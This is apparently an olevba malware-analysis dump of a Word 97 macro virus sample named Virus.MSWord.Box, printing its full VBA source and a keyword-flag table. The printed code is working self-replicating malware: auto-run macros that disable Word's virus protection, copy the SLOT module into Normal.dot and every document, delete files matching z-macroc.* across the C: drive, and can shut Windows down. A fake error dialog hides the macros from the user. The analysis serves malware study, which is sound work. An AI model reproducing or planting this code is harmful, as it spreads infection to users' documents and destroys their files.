olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Box-36f34cb69045a732af72c782205153548a33ae77
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Box-36f34cb69045a732af72c782205153548a33ae77 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO SLOT.bas 
in file: Virus.MSWord.Box-36f34cb69045a732af72c782205153548a33ae77 - OLE stream: 'Macros/VBA/SLOT'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub autoclose()
On Error GoTo exit_
    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone
    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False
    Set ActiveDoc = ActiveDocument
    Set GlobalDoc = NormalTemplate
    DocumentInstalled = False
    GlobalInstalled = False

    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = "SLOT" Then
            DocumentInstalled = True
        End If
    Next

    For j = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(j).Name = "SLOT" Then
            GlobalInstalled = True
        End If
    Next

    If DocumentInstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="SLOT", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
    End If

    If GlobalInstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="SLOT", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
End If
Application.DisplayAlerts = wdAlertsAll

WordBasic.DisableInput 1
On Error GoTo -1: On Error GoTo exit_
WordBasic.DisableAutoMacros 0
WordBasic.Call "box1"
exit_:
End Sub

Sub autoopen()
On Error GoTo exit_
    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone
    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False
    Set ActiveDoc = ActiveDocument
    Set GlobalDoc = NormalTemplate
    DocumentInstalled = False
    GlobalInstalled = False

    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = "SLOT" Then
            DocumentInstalled = True
        End If
    Next

    For j = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(j).Name = "SLOT" Then
            GlobalInstalled = True
        End If
    Next

    If DocumentInstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="SLOT", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
    End If

    If GlobalInstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="SLOT", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
End If
Application.DisplayAlerts = wdAlertsAll

WordBasic.DisableInput 1
On Error GoTo -1: On Error GoTo exit_
WordBasic.DisableAutoMacros 0
WordBasic.Call "box1.SK"
exit_:
End Sub


Sub box1()
ReDim nm__(2)
Dim monkey
Dim tog$
Dim i
Dim x
Dim a$
WordBasic.DisableInput 1
 
On Error Resume Next
If WordBasic.Day(WordBasic.Now()) <= WordBasic.Int(Rnd() * 30) Then GoTo exit_

slotgame:
On Error Resume Next
Err.Number = 0
monkey = -1
tog$ = ""
i = 0
While monkey = -1
For i = 0 To 2
nm__(i) = WordBasic.Int(Rnd() * 10)
If i = 2 Then
tog$ = tog$ + Str(nm__(2))
GoTo banana
End If
tog$ = tog$ + Str(nm__(i))
Next i
banana:
WordBasic.Beep

WordBasic.MsgBox "¤µ¤С¬O " + WordBasic.[Date$]() + " ,ёт§AЄ±¤@­УSLOTЄє№CАё" + Chr(13) + _
" ёХёХ§AЄє¤в®р§a !§Aіo§вЄє©Ї№Bё№ЅX¬O. . . " + Chr(13) + _
tog$ + " ", "Macro Slot Game 4 for Word97"
If tog$ = Str(nm__(i)) + Str(nm__(i)) + Str(nm__(i)) Then
WordBasic.Beep

lucky7:
WordBasic.MsgBox " «x.......§AЄє¤в®р¤Јїщіб! ", _
"Macro Slot Game 4 for Word97"
WordBasic.FileNewDefault
WordBasic.CenterPara
WordBasic.FormatFont Font:="ІУ©ъЕй", Points:=64, Color:=2, Bold:=1, Underline:=1
WordBasic.Insert "¶в! єв §A Ё« №B !!"
For x = 1 To 10
WordBasic.Beep
Next x
GoTo exit_

Else
WordBasic.Beep
On Error GoTo -1: On Error GoTo slotgame
Err.Number = 0
a$ = WordBasic.[InputBox$]("§AЄє¤в®р¤У­I¤F ! µ№§A¤@­УВЅҐ»Єєѕч·|©О¬OёХёХ¤U¤@§в§a ! ЅРїй¤J¤T¦мјЖ№LГц±KЅX  , Іq¤¤¤FґN«O°e§A№LГц ! ·нµM !  §A¤ЈІq¤]¦ж ! ", _
"Macro Slot Game 4 for Word97")
WordBasic.Beep
If a$ = "777" Then GoTo unlucky Else GoTo try
End If

try:
On Error Resume Next
Err.Number = 0
WordBasic.MsgBox " іo јЛ ¤l ¤Ј ¦ж іб !§A ҐІ ¶· їй ¤J Ґї ЅT Єє ±K ЅX ©О ¬O «ц ¤U Ёъ ®ш ¤~ ¦ж іб ! ", _
"Macro Slot Game 4 for Word97"
GoTo slotgame
Wend


unlucky:

On Error Resume Next
WordBasic.MsgBox "OK ! Now We EXIT!", _
"Macro Slot Game 4 for Word97"

exit_:
End Sub


Sub SK()
Dim q$
SK:
WordBasic.DisableInput 1
On Error GoTo -1: On Error GoTo exit_
WordBasic.FileFind SearchPath:="c:\", Name:="z-macroc.*", SubDir:=1

q$ = WordBasic.[FoundFileName$](1)
If q$ = "" Then GoTo bye Else
WordBasic.Kill q$
If Err.Number = 0 Then
GoTo SK
Else
End If
WordBasic.MsgBox "ҐШ јР АЙ ®Ч ¤w іQ ІЧ µІ !!", "·j ґM »P ІЧ µІ "
GoTo bye

exit_:
WordBasic.ExitWindows

bye:
End Sub


Sub toolsmacro()
Dim Pb

WordBasic.DisableInput 1
On Error Resume Next
WordBasic.BeginDialog 359, 271, "ҐЁ¶°"
    WordBasic.PushButton 234, 6, 120, 21, "їэ»s(O)...", "Push1"
    WordBasic.PushButton 234, 29, 120, 21, "Ёъ®ш", "Push2"
    WordBasic.PushButton 234, 55, 120, 21, "°х¦ж(R)", "Push3"
    WordBasic.PushButton 234, 79, 120, 21, "«ШҐЯ(E)", "Push4"
    WordBasic.PushButton 234, 103, 120, 21, "§R°Ј(D)", "Push5"
    WordBasic.PushButton 234, 130, 120, 21, "  ІХ¦XєЮІz(G)...", "Push6"
    WordBasic.PushButton 234, 154, 120, 21, "»Ў©ъ(H)", "Push7"
    WordBasic.Text 10, 9, 96, 18, "ҐЁ¶°¦WєЩ(M):", "Text1"
    WordBasic.Text 10, 175, 112, 13, "ҐЁ¶°§@ҐО©у(A):", "Text2"
    WordBasic.Text 10, 207, 64, 15, "»Ў©ъ(I):", "Text3"
    WordBasic.TextBox 11, 23, 213, 18, "TextBox5"
    WordBasic.TextBox 15, 42, 207, 129, "TextBox6", 1
    WordBasic.TextBox 11, 188, 340, 18, "TextBox3"
    WordBasic.TextBox 12, 223, 341, 39, "TextBox4", 1

WordBasic.EndDialog
Dim dlg As Object: Set dlg = WordBasic.CurValues.UserDialog
Pb = WordBasic.Dialog.UserDialog(dlg)
If Pb = 2 Then GoTo bye
If Pb = 5 Then killer
If Pb = 6 Then killer
WordBasic.Beep
WordBasic.MsgBox "°OѕРЕйҐО§№", "WordBasic Err =7", 32

bye:
End Sub

Sub killer()
On Error Resume Next
End Sub

Public Sub FileTemplates()
WordBasic.Beep
WordBasic.MsgBox "°OѕРЕйҐО§№", "WordBasic Err =7", 48

End Sub

Public Sub autonew()
On Error GoTo exit_
    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone
    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False
    Set ActiveDoc = ActiveDocument
    Set GlobalDoc = NormalTemplate
    DocumentInstalled = False
    GlobalInstalled = False

    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = "SLOT" Then
            DocumentInstalled = True
        End If
    Next

    For j = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(j).Name = "SLOT" Then
            GlobalInstalled = True
        End If
    Next

    If DocumentInstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="SLOT", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
    End If

    If GlobalInstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="SLOT", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
End If
Application.DisplayAlerts = wdAlertsAll

WordBasic.DisableInput 1
On Error GoTo -1: On Error GoTo exit_
WordBasic.DisableAutoMacros 0
WordBasic.Call "box1"
exit_:

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|AutoExec  |autonew             |Runs when a new Word document is created     |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

